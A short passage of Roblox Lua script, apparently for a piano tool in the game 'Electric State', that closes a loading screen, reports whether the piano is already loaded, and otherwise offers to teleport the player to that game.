    setcoregui:Disconnect()
    loader("Loading Complete, Enjoy!",UDim2.new(0, 147, 0, 56))
    wait(.7)
    Loader:Destroy()
elseif _G.pianoloaded then
    senderror("Piano Already Loaded")
else
    local note_4 = Instance.new("Sound",game:GetService("CoreGui"))
    note_4.SoundId = "rbxassetid://6432593850"
    note_4:Play()
    local bindable = Instance.new("BindableFunction")
    function bindable.OnInvoke(j)
        if j == "Yes" then
            game:GetService("TeleportService"):Teleport(2262441883)
        end
    end
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "! Wrong Game !",
        Text = "Teleport to Electric State?",
        Duration = 5,
        Callback = bindable,
        Button1 = "Yes",
        Button2 = "No",
    })
end